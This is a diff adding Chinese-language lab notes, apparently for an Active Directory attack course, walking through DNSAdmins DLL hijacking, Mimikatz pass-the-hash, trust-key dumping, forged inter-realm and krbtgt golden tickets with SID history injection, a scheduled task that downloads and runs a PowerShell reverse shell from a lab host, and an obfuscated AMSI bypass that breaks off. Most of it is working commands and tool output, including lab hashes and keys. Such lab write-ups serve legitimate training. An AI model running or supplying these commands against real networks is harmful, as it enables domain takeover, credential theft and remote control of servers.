@@ -3862,3 +3862,590 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 
 问题：Alternate service accessed on dcorp-dc by abusing Constrained delegation on dcorp-adminsrv
 答案：LDAP
+
+## DNSAdmins 提权
+原理： DNSAdmins组的成员可以以 dns.exe(系统)的权限加载任意动态链接库（DLL劫持）
+前提：需要一个用户是DNSAdmins组成员，并且拥有这个用户的哈希
+
+枚举：
+```
+PS C:\ad> Get-NetGroupMember -GroupName "DNSAdmins"
+
+
+GroupDomain  : dollarcorp.moneycorp.local
+GroupName    : DnsAdmins
+MemberDomain : dollarcorp.moneycorp.local
+MemberName   : srvadmin
+MemberSID    : S-1-5-21-1874506631-3219952063-538504511-1115
+IsGroup      : False
+MemberDN     : CN=srv admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+```
+srvadmin是DnsAdmins组成员
+```
+srvadmin:a98e18228819e8eec3dfa33cb68b0728
+```
+
+下面命令生成一个srvadmin的shell
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
+```
+
+模板DLL利用代码：
+```
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+```
+
+把system里面的命令换成想要执行的命令即可，例如可以把当前账号添加进管理员用户组：```cmd.exe /k net localgroup administrators user /add```
+
+kali编译成DLL文件：
+> x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
+
+利用DNSAdmins group的组成员权限，使用dnscmd.exe (needs RSAT DNS)配置DNS的动态链接库
+```
+dnscmd dcorp-dc /config /serverlevelplugindll\\172.16.50.66\dll\mimilib.dll
+```
+重启DNS服务，使得dll劫持生效（不过这一定会影响公共域环境的DNS服务，不要在公共域环境做这个实验）
+```
+sc \\dcorp-dc stop dns
+sc \\dcorp-dc start dns
+```
+
+# Learning Objective 19:
+Task
+● Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using the domain trust key.
+
+这一节主要是跨域访问，子域到父域
+
+
+前面已经知道DA管理员Administrator的哈希
+```
+Administrator: af0686cc0ca8f04df42210c9ac980760
+```
+打开一个具有DA权限的shell
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
+```
+
+枚举所有Trust tikets
+```
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
+```
+
+执行：
+```
+PS C:\ad> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # lsadump::trust /patch
+
+Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-1874506631-3219952063-538504511)
+
+Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
+    * 1/23/2022 11:37:21 PM - CLEAR   - 28 62 25 ae 13 68 18 ad e4 4f b2 7c 22 64 22 9d 8f f7 ac c3 0e 24 2b 09 00 50 4b 35
+        * aes256_hmac       ff3616ac06c24395fb76b08d7cc7f0038cd257869b43eb13ebaf9a3061929a1e
+        * aes128_hmac       a2ab6e6daf483e61ed6ffa50856ad277
+        * rc4_hmac_nt       13d28ca9e5863231c89eda2b2b1756d7
+
+ [ Out ] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 1/23/2022 11:37:21 PM - CLEAR   - 28 62 25 ae 13 68 18 ad e4 4f b2 7c 22 64 22 9d 8f f7 ac c3 0e 24 2b 09 00 50 4b 35
+        * aes256_hmac       1f7bb465843dcd19eaa9ebe5ffdc92f5c8cefd84e7d70fb0ba2a27b41e52b075
+        * aes128_hmac       5739ec70d0d4162853c3c2d7954db14d
+        * rc4_hmac_nt       13d28ca9e5863231c89eda2b2b1756d7
+
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
+    * 1/23/2022 11:35:54 PM - CLEAR   - f0 1c 6e 77 b7 5a 7a 00 ab 3c ce 4e 08 c0 17 46 f5 89 25 c3 c5 8b a7 8e 2d 6b 67 97
+        * aes256_hmac       b1d0cce7e14b65e8ae122cb5d49767a1b99e0db9c10a960f8bee6315b85c8e0b
+        * aes128_hmac       1921343ce7de2cb2188e5e687c7b54f3
+        * rc4_hmac_nt       94e5fc7691c1f1b4b6a9c1a97950f5a1
+
+ [Out-1] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 1/23/2022 11:35:54 PM - CLEAR   - f0 1c 6e 77 b7 5a 7a 00 ab 3c ce 4e 08 c0 17 46 f5 89 25 c3 c5 8b a7 8e 2d 6b 67 97
+        * aes256_hmac       e2afb4ff3d023d4af1e56b5592dfc3bcf9733e38f7827bd773bc66433dea6469
+        * aes128_hmac       7e55143a5eac219667d2d4ac723dd625
+        * rc4_hmac_nt       94e5fc7691c1f1b4b6a9c1a97950f5a1
+
+
+Domain: US.DOLLARCORP.MONEYCORP.LOCAL (us / S-1-5-21-3146393536-1393405867-2905981701)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
+    * 3/16/2021 7:44:52 AM - CLEAR   - 40 84 47 82 3b 03 64 82 0f 8e bf d3 78 18 df db d4 5f 13 bc 4d 7c df b5 8e f8 e3 29 ae e1 01 ce 20 c4 03 48 8f 4f 4e 77 eb a0 3b 1d 55 84 ba b0 72 62 4d df 34 df 2d 67 e7 78 8a 6a 18 99 87 11 f2 56 d7 34 e5 9b 88 b1 9d 91 b3 4e 11 2f 76 89 c2 45 7d c6 20 9a 83 97 ca 50 0e 33 d2 04 4f 82 83 69 46 d6 13 cf 8f db cd fe 3d 87 66 c9 ca 7f 24 38 ff c0 1b 5a 5f bf 58 b3 c7 83 06 2c f0 da fd f4 1b 46 de ca 61 e6 8e 8f ec d5 a8 6e 57 84 6f 42 cb 8c b3 ff 3f 14 8a c4 7c a7 c0 17 60 31 a0 2c 4b 0c 44 80 9e 37 77 37 df ea 32 96 16 ab e5 a3 f5 0b 8c 46 d9 7f 26 f3 05 7c 7f bb ac 16 be 5c ea a3 50 ee f0 ef 9a 4e fe a3 0a 6d f6 f2 5f c9 54 ee 47 20 02 ae 07 96 c4 c8 08 64 70 56 59 28 22 00 53 74 be 67 45 03 d9 e6 86 e5 36 42
+        * aes256_hmac       f13e09bb5b6f02a995d99a4c95982c1e6411b1b252d1aa268c25b9adcd22953f
+        * aes128_hmac       20e6b9441a57a19d14c62bb87a055264
+        * rc4_hmac_nt       3c26a18320e50801d1c3843a129617f8
+
+ [ Out ] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 3/20/2021 8:54:34 AM - CLEAR   - eb b8 c7 9a 62 b0 f8 e3 ce b6 0d 22 9d 68 67 a2 dd 8e d4 b1 2f a6 dc 75 ea cd 69 dc 1f 3f cd 7d b5 bb a4 a7 f7 81 61 ed f6 c6 ad a1 e9 38 7c 5b ce 02 42 e0 4e a5 dd 42 70 bc be be 99 79 9b b7 26 94 85 8d 15 8c 82 ac 24 ba 47 4f 13 90 ad 3d 75 f8 25 64 f1 ff 6d ba cc bc ef e8 ed 3f 7b 3a 88 f1 6d 2f ba 15 f6 9b 98 e0 11 aa 56 4e 61 74 af 0f 82 ca 5c c8 e4 7b 46 73 f2 82 12 32 be 58 21 92 b8 86 03 d3 16 db cb d7 38 0a ca 99 a6 b8 20 14 95 a9 8c c2 25 7e dc a7 6b 0c 95 49 5d 0d 38 be ac f1 8b 6e 53 d7 97 38 7c 0d d1 0c 29 d1 8c da 71 89 45 64 aa 35 55 4c f5 be 6d 9f fb c2 fb 07 5e cb 25 ec 38 ae a4 ee ee d7 43 e8 a1 45 63 43 26 69 30 f9 f9 ef 21 a5 cf 31 2a b6 6c d9 b3 cc e9 f2 a6 8d 2e ca f7 f6 c2 c0 66 30 ed ff
+        * aes256_hmac       93a29ddd4ad24fde12c2bca0dc08574bb2a2f80d3654a7b4809b18257139c84b
+        * aes128_hmac       94ae739b0afa370080237a35e762d2f6
+        * rc4_hmac_nt       63ea4769982101c8e8bee58c67419371
+
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
+    * 3/16/2021 7:43:48 AM - CLEAR   - 34 ff 93 5b c5 57 59 34 b9 be 48 7c 32 40 e0 34 52 56 91 9c 45 4b 1e b2 1d 0a 07 87 c6 cd 3a f8 c9 1f f8 2e 91 f5 c5 3f 5b c5 34 f4 5a 42 90 fc f8 6a 00 38 b5 d9 2f 48 c4 3f b5 79 0e 07 f2 5f 14 92 38 90 54 0c 38 9f e7 c3 43 43 c5 79 e2 db 2b 45 73 d8 43 47 9c 8e 9c 7c 35 d4 8b b7 a3 a2 1c f5 5f 5a 7b 0e d0 db bb 5f 62 c3 94 7a 7e 7e 34 48 d2 65 ff 77 5a ee 33 29 64 0c 64 e0 80 77 bd 05 e0 36 b2 e3 c7 e0 d2 bd 33 dd c8 66 e3 b2 39 01 57 81 9b e2 87 6a ec 26 98 f3 c5 0b 04 bf 64 6f f2 4d b6 89 cb b3 a9 d6 a9 32 b2 3f 66 29 61 be 67 27 9c 0a 7a 99 c7 27 61 f1 bf af 53 9e 10 4f c8 56 a3 df 1f 16 8f 85 d9 01 86 dd e8 f5 1f 36 9b 43 51 91 62 24 1a e3 6f 86 ab d9 f8 1f 3d 2b 4a 58 6a 01 a7 e2 05 62 6f 9c 1d 3c 5d 09
+        * aes256_hmac       852cfdffd122e0595792a487554bddc6994f4a62bce15c75575094c968218ad8
+        * aes128_hmac       340e7e0b5fd707c5ce9c207d7cc19228
+        * rc4_hmac_nt       4f6b49aa2becd4dacec0daf1a86dd3fc
+
+ [Out-1] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 3/20/2021 8:54:34 AM - CLEAR   - bc 2a 0a ae 7d ae 0a f0 b7 2e 04 87 48 5b ad 40 32 c5 a7 9e b0 48 75 2e b9 81 86 5f 93 50 77 ca 86 c7 0f f3 1b 5c 05 35 c7 85 6b 25 78 70 40 dd 69 0f f9 57 1f f9 a3 70 0a ec a4 e9 18 00 64 cf 90 40 22 f2 0e 61 b1 16 78 85 bd 11 28 81 79 e7 17 54 5a 05 99 13 b0 2f bf e4 38 d1 6e b5 0f 4b 80 1e b6 e5 d6 8f 8d 01 f1 74 78 d8 15 44 d1 ff b7 99 b4 50 56 a7 51 07 01 da 48 d8 83 66 46 3e da 1d da 97 b4 af 29 c4 24 27 50 5e ef d4 67 d7 bb df ef 21 94 e4 17 50 2f a1 b2 4b e1 3a 75 49 76 bb 04 0a 34 18 96 d5 ae e0 9c af 11 ae aa 61 84 3c 45 16 db 12 30 79 ef e2 1e 7d cf 6f a5 7a 19 ad 91 b9 df bb d9 45 ba 1b ba 60 b1 68 ba 36 bc 47 1f 59 bb a6 b2 ed 59 ac be 15 89 40 90 39 ea 8c a9 d5 cb 84 b6 ab b3 75 f2 28 c0 99 65 0c
+        * aes256_hmac       6add5f0941e99beee725c5b0a8ea78eaf519a6011283f33bab124f8fa2c90a66
+        * aes128_hmac       627647090c3f2d24585ddd56b76c2e0b
+        * rc4_hmac_nt       340965a2803f7f51e68681b701902ede
+
+
+Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
+    * 1/29/2022 1:20:05 AM - CLEAR   - 1f 6f c4 25 57 c2 50 6e e2 8c b8 94 07 da 97 13 cc 89 5d 6d 0e 47 05 91 74 7c 3a c1
+        * aes256_hmac       91df6bcc4a71d585b710532ff73b662d43e4d83a00821f7d509319e4ce1897c5
+        * aes128_hmac       47f41fc169b79c34d8af08afa3cfdde9
+        * rc4_hmac_nt       cccb3ce736c4d39039b48c79f075a430
+
+ [ Out ] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 1/29/2022 1:20:05 AM - CLEAR   - 1f 6f c4 25 57 c2 50 6e e2 8c b8 94 07 da 97 13 cc 89 5d 6d 0e 47 05 91 74 7c 3a c1
+        * aes256_hmac       1600f6d433093cc534f579dd75b44a8a2f37b983904c507b74f8eb436cd04f4e
+        * aes128_hmac       948cc8e718be3f8eecf498cfa5d6996b
+        * rc4_hmac_nt       cccb3ce736c4d39039b48c79f075a430
+
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
+    * 1/29/2022 1:19:50 AM - CLEAR   - 9e 38 00 0f f1 61 6b 4f 03 ef 9a 4d 66 44 ce 9f 15 1a ee 57 82 dc 5a a0 92 db 99 03
+        * aes256_hmac       d368377248c50ef663e50cf9109512d018b48964ff08e6e06c93ae967ed7ebce
+        * aes128_hmac       f523829c0e7edc43630ed264b7864de9
+        * rc4_hmac_nt       a4ba38d6d528d447371bc2bf9edd8d18
+
+ [Out-1] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 1/29/2022 1:19:50 AM - CLEAR   - 9e 38 00 0f f1 61 6b 4f 03 ef 9a 4d 66 44 ce 9f 15 1a ee 57 82 dc 5a a0 92 db 99 03
+        * aes256_hmac       b21647a7b6a2996c09c96985d907d13d0bb997016bfa177cc89132fdebd7c6c5
+        * aes128_hmac       b7e4341a1b8a9cbe43b8b92447c31c07
+        * rc4_hmac_nt       a4ba38d6d528d447371bc2bf9edd8d18
+```
+
+下面命令伪造一条到父域```moneycorp.local```的TGT，从上面信息我们得知，父域的SID是：```S-1-5-21-280534878-1496970234-700767426```
+
+这里需要注意下面命令参数里的rc4，必须是上面枚举出来的
+```* rc4_hmac_nt       13d28ca9e5863231c89eda2b2b1756d7```这个值
+
+而不是Administrator的NTML的值
+```
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:13d28ca9e5863231c89eda2b2b1756d7 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\kekeo_old\trust_tkt.kirbi"'
+```
+
+执行：
+```
+PS C:\ad\kekeo_old> Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-
+1496970234-700767426-519 /rc4:13d28ca9e5863231c89eda2b2b1756d7 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\kekeo_old\trust_tkt.kirbi"'
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:13d28ca9e5863231c89eda2b2b1756d7 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\kekeo_old\trust_tkt.kirbi
+User      : Administrator
+Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
+SID       : S-1-5-21-1874506631-3219952063-538504511
+User Id   : 500
+Groups Id : *513 512 520 518 519
+Extra SIDs: S-1-5-21-280534878-1496970234-700767426-519 ;
+ServiceKey: 13d28ca9e5863231c89eda2b2b1756d7 - rc4_hmac_nt
+Service   : krbtgt
+Target    : moneycorp.local
+Lifetime  : 2/15/2022 11:54:26 PM ; 2/13/2032 11:54:26 PM ; 2/13/2032 11:54:26 PM
+-> Ticket : C:\AD\kekeo_old\trust_tkt.kirbi
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Final Ticket Saved to file !
+```
+
+TGT文件已保存到```C:\AD\kekeo_old\trust_tkt.kirbi```
+
+制作一张可以访问父域moneycorp.local的TGS
+
+```
+.\asktgs.exe C:\AD\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
+```
+
+执行：
+```
+PS C:\ad\kekeo_old> .\asktgs.exe C:\AD\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
+
+  .#####.   AskTGS Kerberos client 1.0 (x86) built on Dec  8 2016 00:31:13
+ .## ^ ##.  "A La Vie, A L'Amour"
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
+  '#####'                                                     * * */
+
+Ticket    : C:\AD\kekeo_old\trust_tkt.kirbi
+Service   : krbtgt / moneycorp.local @ dollarcorp.moneycorp.local
+Principal : Administrator @ dollarcorp.moneycorp.local
+
+> CIFS/mcorp-dc.moneycorp.local
+  * Ticket in file 'CIFS.mcorp-dc.moneycorp.local.kirbi'
+```
+
+将 TGS 呈现给目标服务
+```
+.\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
+```
+执行：
+```
+PS C:\ad\kekeo_old> .\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
+
+  .#####.   KiRBikator 1.1 (x86) built on Dec  8 2016 00:31:14
+ .## ^ ##.  "A La Vie, A L'Amour"
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
+  '#####'                                                     * * */
+
+Destination : Microsoft LSA API (multiple)
+ < .\CIFS.mcorp-dc.moneycorp.local.kirbi (RFC KRB-CRED (#22))
+ > Ticket Administrator@dollarcorp.moneycorp.local-CIFS~mcorp-dc.moneycorp.local@MONEYCORP.LOCAL : injected
+```
+
+现在就可以访问目标的文件系统了。如果能够访问，证明我们升级成了父域的DA
+```
+PS C:\ad\kekeo_old> ls \\mcorp-dc.moneycorp.local\c$
+
+
+    Directory: \\mcorp-dc.moneycorp.local\c$
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       11/29/2019   4:33 AM                PerfLogs
+d-r---        2/16/2019   9:14 PM                Program Files
+d-----        7/16/2016   6:23 AM                Program Files (x86)
+d-r---        2/16/2019   9:14 PM                Users
+d-----        8/20/2020   2:57 AM                Windows
+```
+
+
+我们同样可以使用 Rubeus来达到同样的效果，注意我们仍然使用最初生成的TGT.这个可以新开一个student VM测试
+
+```
+.\Rubeus.exe asktgs /ticket:C:\AD\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
+```
+
+执行：
+```
+PS C:\ad> .\Rubeus.exe asktgs /ticket:C:\AD\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-d
+c.moneycorp.local /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: Ask TGS
+
+[*] Using domain controller: mcorp-dc.moneycorp.local (172.16.1.1)
+[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+[*] Building TGS-REQ request for: 'cifs/mcorp-dc.moneycorp.local'
+[+] TGS request successful!
+[+] Ticket successfully imported!
+[*] base64(ticket.kirbi):
+
+      doIFDDCCBQigAwIBBaEDAgEWooID7zCCA+thggPnMIID46ADAgEFoREbD01PTkVZQ09SUC5MT0NBTKIr
+      MCmgAwIBAqEiMCAbBGNpZnMbGG1jb3JwLWRjLm1vbmV5Y29ycC5sb2NhbKOCA5owggOWoAMCARKhAwIB
+      GqKCA4gEggOE2pXAp7qlXodFtjWijF0xryRTKewkMw4/DCOaP/7tImo4652Fn1jXeKuZmiC0lB/sHJHZ
+      RmfbdpSuApbQbRKONObKfMHhXNjO8dwZ0XNXvfge+SfYOmz1TCyeY/ozWb6n4T5CXlY8MqFoXcmdblZ9
+      rxUbPDsOJqXxahheTDnOnfnTV7QtWuZTXCxiZiQfBR+nTIhtIVBHGiSVc/Z/GBA9cIsT5hRhacdq9Jiv
+      9uT+qiyGJPubr55A11zd5Xms6jIgHSADoQS4PpIJUCgSQUj8ofESzA31g3ReRthGJEPmGYm5am/THit7
+      xRv2I7U+KlopXbA5SX3/DCSBFaV5SAfg2F0vLKjenaeu8bLssT1jaIzfi4YL9tQSo61HaPMvKj/YISwr
+      6iboTDlpFmpSICS4nDCLWn9zNSgo3WtNBfBGda9NoBjir2GiCKSEq98NtmRE8LbJ24Zotw3LIgrVXV0f
+      0XS81j5morIdOgqVZYKFVmKj6JbcStl+BM818iIsxO8w76cytk0OZ4AugBa1/dcfdt6kU5t7itBZfklu
+      j2m+dgFX8RFNGAzhD/dLLHjevrTZsZ6O0jULrUes5uuhCgI3A06iNPRy+jSygxNy10V8NKXPb1XjLvQx
+      Cb8f4+WmenpOHB08/Wux6s/f1uHUJyqx/VqS8Al/m/nM/BvqOXGZNuvPu2lvlHw5pMl/dMM4Q7jiGrlg
+      tGdDW+fbqB3hIQta1yGFhGmZJNe7W+r6ZrFT2vUwMk0XdP8+/Sg/Emp0uB2bOsapJhHrJ690GhbrPGrL
+      4cRxGWENh9dXqI7T7wumD0Svicky8j+3jAccBNkIcuwoWM7DL8Fi4rs5WSWfx+fCbZCyJLdy0Fv+bAPw
+      qkb1ypbVz73fy8Dg6XLWwEo3ovM86UGnqjaddF7qN36d7BtbN8aIo4TuwQZAD7esXnryMglJJqenwsz+
+      tgI9HHUcEO15SiVYwnnDLftf8fhbSaPZDlyBpDIAwLDKYDnVPt0ZhA1NFRDXi07WIda4SyaEpInDsF6P
+      XDQscAzC+SnFaXxjH5+8TPYIetJmhx7mDATBkGZyY3uca8KpxppGBm6pTwdDViOYXmpUzr+nLnJEk90Q
+      Er+noKD7wWWAUrvgdS+H9baZhfOKh6zAzujkl9qbIddtGFPF6gXOnB905tjEftrx0QQC0ySuGax5HbtD
+      CxAV7pfyn7zKo4IBBzCCAQOgAwIBAKKB+wSB+H2B9TCB8qCB7zCB7DCB6aArMCmgAwIBEqEiBCAmVhu2
+      Q0LStKem6mlzjXM6zGv59/M9Pgv4tSbz5ps0GKEcGxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKIa
+      MBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEClAAClERgPMjAyMjAyMTYwODA0MTdaphEYDzIw
+      MjIwMjE2MTgwNDE3WqcRGA8yMDIyMDIyMzA4MDQxN1qoERsPTU9ORVlDT1JQLkxPQ0FMqSswKaADAgEC
+      oSIwIBsEY2lmcxsYbWNvcnAtZGMubW9uZXljb3JwLmxvY2Fs
+
+  ServiceName           :  cifs/mcorp-dc.moneycorp.local
+  ServiceRealm          :  MONEYCORP.LOCAL
+  UserName              :  Administrator
+  UserRealm             :  dollarcorp.moneycorp.local
+  StartTime             :  2/16/2022 12:04:17 AM
+  EndTime               :  2/16/2022 10:04:17 AM
+  RenewTill             :  2/23/2022 12:04:17 AM
+  Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+  KeyType               :  aes256_cts_hmac_sha1
+  Base64(key)           :  JlYbtkNC0rSnpuppc41zOsxr+ffzPT4L+LUm8+abNBg=
+```
+
+访问父域的文件系统
+```
+
+PS C:\ad> ls \\mcorp-dc.moneycorp.local\c$
+
+
+    Directory: \\mcorp-dc.moneycorp.local\c$
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       11/29/2019   4:33 AM                PerfLogs
+d-r---        2/16/2019   9:14 PM                Program Files
+d-----        7/16/2016   6:23 AM                Program Files (x86)
+d-r---        2/16/2019   9:14 PM                Users
+d-----        8/20/2020   2:57 AM                Windows
+```
+
+问题：SID history injected to escalate to Enterprise Admins
+答案：S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519
+
+
+# Learning Objective 20:
+Task
+● Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp's krbtgt hash.
+
+
+下面命令制作一张用户krbtgt到父域的TGT
+由于之前我们已经拿到了krbtgt的hash值，这里直接使用
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_tkt.kirbi"'
+```
+执行
+```
+PS C:\ad> . .\Invoke-Mimikatz.ps1
+PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-
+21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da267
+96f35 /ticket:C:\AD\krbtgt_tkt.kirbi"'
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_tkt.kirbi
+User      : Administrator
+Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
+SID       : S-1-5-21-1874506631-3219952063-538504511
+User Id   : 500
+Groups Id : *513 512 520 518 519
+Extra SIDs: S-1-5-21-280534878-1496970234-700767426-519 ;
+ServiceKey: ff46a9d8bd66c6efd77603da26796f35 - rc4_hmac_nt
+Lifetime  : 2/16/2022 12:30:00 AM ; 2/14/2032 12:30:00 AM ; 2/14/2032 12:30:00 AM
+-> Ticket : C:\AD\krbtgt_tkt.kirbi
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Final Ticket Saved to file !
+```
+
+TGT文件已生成在:```C:\AD\krbtgt_tkt.kirbi```
+
+下面命令把TGT注入到mimikatz中
+```
+Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\krbtgt_tkt.kirbi"'
+```
+
+使用下面两个命令之一验证上面操作是否成功
+```
+gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
+```
+或者
+```
+ls \\mcorp-dc.moneycorp.local\c$
+```
+
+利用上面已经取得的权限，为mcorp-dc添加一个定时任务
+```
+schtasks /create /S mcorp-dc.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User3666" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
+```
+
+触发定时任务
+```
+schtasks /Run /S mcorp-dc.moneycorp.local /TN "User3666"
+```
+
+收到反弹shell
+```
+PS C:\ad> .\nc.exe -lnvp 443
+listening on [any] 443 ...
+connect to [172.16.100.66] from (UNKNOWN) [172.16.1.1] 59665
+
+
+Windows PowerShell running as user MCORP-DC$ on MCORP-DC
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>PS C:\Windows\system32> whoami
+nt authority\system
+PS C:\Windows\system32> hostname
+mcorp-dc
+PS C:\Windows\system32>
+```
+
+要马上byopass AMSI，不然可能会卡死
+```
+PS C:\Windows\system32>S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' )
+-VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) ).
